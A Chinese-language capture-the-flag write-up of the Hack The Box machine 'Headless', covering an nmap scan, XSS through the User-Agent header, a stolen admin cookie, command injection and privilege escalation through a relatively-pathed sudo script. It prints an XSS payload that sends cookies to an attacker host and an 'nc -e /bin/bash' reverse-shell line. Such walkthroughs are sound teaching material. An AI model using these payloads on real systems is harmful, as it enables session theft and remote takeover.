---
title: HTB - Headless 
published: 2024-05-21
tags: [HTB]
category: Write Up
draft: false
password: $y$j9T$2cy/WxPggISXkBDRmZbL10$0w8yfYfo92xIpj.Qu7zcpzqjLInUcI26SaM2l0IRS.7
abstract: 你看不到我...你看不到我...
message: 輸入密碼
---

# HTB - Headless 

Target IP : ```10.10.16.28```

![圖片](https://hackmd.io/_uploads/rkl9VhKXA.png)


---

## user.txt

### Port enumeration
```
# Nmap 7.94SVN scan initiated Mon May 20 23:41:11 2024 as: nmap -sS -sC -sV -oA hannd -p- -vv -T5 --min-rate=1000 10.129.36.179
Nmap scan report for 10.129.36.179
Host is up, received echo-reply ttl 63 (0.14s latency).
Scanned at 2024-05-20 23:41:12 EDT for 177s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
|   256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Tue, 21 May 2024 03:42:50 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=5/20%Time=664C1822%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Tue,\x2021\x20May\x202024\x2003:42:50\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 20 23:44:09 2024 -- 1 IP address (1 host up) scanned in 178.09 seconds

```

### XSS injection
看到有一個開 5000 回傳 HTTP 資料的端口
用瀏覽器先測試一下有沒有 XSS 的漏洞
![圖片](https://hackmd.io/_uploads/SyoNF9YmR.png)

WAF 擋下來了
不過可以看到他很貼心的把我們的Header都印出來
這樣我們就多一個可操控的變數 ```User-Agent```
![圖片](https://hackmd.io/_uploads/H1oSKcKmA.png)

透過插件修改自己的 ```User-Agent``` 
變成 ```<script>alert('1')</script>```
![圖片](https://hackmd.io/_uploads/rygK95t7A.png)

這樣就驗證了這個 XSS注入點
![圖片](https://hackmd.io/_uploads/H1295qFQC.png)

現在我們把 ```User-Agent``` 改成我們的 XSS-Payload
```
<script>var i=new Image(); i.src="http://10.10.16.28:8082/?cookie="+btoa(document.cookie);</script>
```
![圖片](https://hackmd.io/_uploads/H11905FmC.png)

然後開啟一個http.server來接收cookie

![圖片](https://hackmd.io/_uploads/SyOiD2KQA.png)

```aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=```

是我們接收到的數據,需要再去base64解碼

```is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0```

### Subdirectory enumeration
然而只有一個 support 頁面很明顯沒地方使用這個 cookie
所以讓我們先爆破一下子目錄
![圖片](https://hackmd.io/_uploads/rJZRHoYXA.png)

讓我們找到一個叫做 dashboard 的頁面
把拿到的cookie裝上去
![圖片](https://hackmd.io/_uploads/S17RuhKmC.png)

成功讀取到管理員介面
![圖片](https://hackmd.io/_uploads/BkBWrotQA.png)

###  Command injection

到這邊其實可以看到沒什麼操作空間
不過回去看nmap的結果可以注意到兩件事情
1. python網頁伺服器
2. 系統是 linux

然而這個介面是**產生**網站安全報告
猜測要產生安全報告的話可能會使用Python的OS模塊調用系統指令
而我們設定的參數可能就是他檔案的名稱
所以這邊我嘗試 command injection

![圖片](https://hackmd.io/_uploads/r12I5iFXR.png)

拿到一個reverse shell

![圖片](https://hackmd.io/_uploads/H1-Xj3FXR.png)

取得 user.txt

___
## root.txt

### 取得 Shell 必須要做的事情 : sudo -l

可以看到有個能用 root 權限執行的檔案 syscheck
cat 一下發現就是一個腳本
![圖片](https://hackmd.io/_uploads/SJ23AitQR.png)

發現一個很有趣的東西,他似乎會執行一個叫做initdb.sh的腳本
然而這電腦上根本沒有這個腳本
甚至還是用相對路徑的方式存取
![圖片](https://hackmd.io/_uploads/rJAI23tQC.png)

所以我們直接 echo 一個新的檔案
把我們的 payload 放進去
```echo "nc 10.10.16.28 4222 -e /bin/bash" > initdb.sh```
然後用 sudo syscheck 來結束這回合
![圖片](https://hackmd.io/_uploads/B11ZVhKmR.png)
這樣就順利取得 root.txt
![圖片](https://hackmd.io/_uploads/rycfV3KQR.png)

